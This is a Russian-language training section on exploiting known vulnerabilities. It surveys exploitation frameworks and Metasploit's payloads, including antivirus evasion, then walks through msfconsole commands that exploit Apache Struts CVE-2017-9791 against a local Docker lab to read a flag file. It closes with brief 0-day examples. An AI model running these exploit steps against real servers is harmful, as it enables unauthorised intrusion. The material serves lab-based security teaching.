### 6.2 Эксплуатация уязвимостей 1-го дня в сетевых сервисах

Обратим свое внимание на этап эксплуатации уязвимостей.

Зачастую для эксплуатации уязвимостей используются либо отдельные эксплойты, созданные специально под конкретную
уязвимость. Либо используются фреймворки эксплуатации, которые разработаны для унификации подготовки, настройки и
тестирования эксплойтов.

Популярные фреймворки эксплуатации:

- Metasploit Framework (Free): https://www.metasploit.com/
- CobaltStrike ($$$): https://www.cobaltstrike.com/
- Exploit Pack ($$$): http://exploitpack.com/
- Core Impact Pro ($$$): https://www.coresecurity.com/products/core-impact

#### Работа с фреймворком Metasploit входит в список основных навыков для хакеров.

Рассмотрим возможности Metasploit подробнее.

##### Metasploit Framework

Современная версия Metasploit содержит более 2000 эксплойтов, более 1000 модулей разведки и сканирования, модули пост
эксплуатации, нагрузки, кодировщики, средства противодействия обнаружению и пр.

##### Эксплойты

В настоящее время в Metasploit насчитывается более 2000 эксплойтов, сгруппированных по следующим платформам: AIX,
Android, BSD, BSDi, Cisco, Firefox, FreeBSD, HP-UX, Irix, Java, JavaScript, Linux, mainframe, multi (применимо к
нескольким платформам), NetBSD, NetWare, nodejs, OpenBSD, macOS, PHP, Python, R, Ruby, Solaris, Unix и Windows.

##### Полезная нагрузка

В настоящее время Metasploit имеет более 600 полезных нагрузок:

- Командная оболочка позволяет пользователям запускать скрипты сбора данных или выполнять произвольные команды на хосте.
- Meterpreter (интерпретатор Metasploit) позволяет пользователям контролировать экран устройства с помощью VNC, а также
  просматривать, загружать и скачивать файлы.
- Динамические полезные нагрузки позволяют пользователям обходить антивирусную защиту, генерируя уникальные полезные
  нагрузки.
- Статические полезные нагрузки обеспечивают статическую переадресацию IP-адресов/портов для связи между хостом и
  клиентской системой.
- Вспомогательные модули

Metasploit Framework включает сотни вспомогательных модулей, которые могут выполнять сканирование, fuzzing, sniffing и
многое другое. Существует три типа вспомогательных модулей: сканеры, администраторы и серверные модули.

Настройка Metasploit из примера вначале
Команды настройки msfconsole для (CVE-2017-9791)(Команды bash):

```commandline
msfconsole <- Запуск фреймворка

search struts showcase  <- Поиск всех возможных эксплойтов с содержимым строки “struts showcase”

use exploit/multi/http/struts2_code_exec_showcase <- Выбор эксплойта для работы последующей настройки

info <- Изучение информации об эксплойте

options <- Демонстрация опций для настройки эксплойта

set RHOSTS localhost <- Настройка узла для применения эксплойта

set RPORT 1337 <- Настройка порта для применения эксплойта

set TARGETURI /integration/saveGangster.action <- Настройка места нахождения уязвимого плагина на сайте

set PAYLOAD cmd/unix/generic <- Настройка “нагрузки” исполняемой после применения эксплойта

set CMD 'cat /flag' <- Настройка опций нагрузки (Указание команды, которую необходимо выполнить)

check <- Использование “чекера” для проверки корректности настроенного эксплойта

exploit <- Эксплуатация уязвимости


Поднять стенд самостоятельно можно командой docker:

docker run -it --rm -p 1337:8080 --name struts piesecurity/apache-struts2-cve-2017-5638
```

### Уязвимости 0-го дня

Обычно поиск уязвимостей 0-го дня производят энтузиасты, которые в дальнейшем сообщают о найденных уязвимостях
производителям, чтобы те исправили проблемы безопасности.

Среди них можно выделить:

- Пентестеров
- Исследователей


Что может помочь в поиске?
- Анализ исходных кодов
- Динамический анализ
- Фаззинг тестирование

#### Известные случаи утечек уязвимостей 0-го дня:
**EternalBlue** — это компьютерный эксплойт, разработанный Агентством национальной безопасности США (АНБ). Утечка информации
о нем была осуществлена хакерской группой Shadow Brokers 14 апреля 2017 года, через месяц после того, как Microsoft
выпустила патчи для этой уязвимости.

Примеры исследований уязвимостей нулевого дня в публичных библиотеках:
https://imagetragick.com/ — ImageMagick, пакете, обычно используемом веб-службами для обработки изображений, в 2016 году
обнаружено множество уязвимостей. Многие из уязвимостей могут привести к удаленному выполнению кода (RCE) при обработке
изображений, отправленных пользователем.



https://github.com/neex/phuip-fpizdam — это эксплойт для ошибки в php-fpm (CVE-2019-11043). В определенных конфигурациях
nginx + php-fpm ошибка может быть вызвана извне. Это означает, что веб-пользователь может получить выполнение кода, если
у вас уязвимая конфигурация.



